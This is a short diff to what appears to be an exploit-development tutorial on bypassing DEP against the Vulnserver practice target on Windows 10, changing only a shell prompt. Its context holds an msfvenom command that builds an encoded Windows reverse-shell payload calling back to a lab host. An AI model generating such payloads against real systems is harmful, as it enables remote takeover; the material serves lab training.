@@ -293,7 +293,7 @@ Wow! We did it! We bypassed DEP on Windows 10! All we need to do now is add a NO
 
 ```bash
 root@kali:~/vulnserver/TRUN/DEP# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.16 LPORT=4444 -b '\x00' -e x86/shikata_ga_nai -f python -o shellcode.txt
-sed -ie "s/buf/shellcode/g" shellcode.txt
+root@kali:~/vulnserver/TRUN/DEP# sed -ie "s/buf/shellcode/g" shellcode.txt
 ```
 
 Add the shellcode and NOP sled to our exploit:
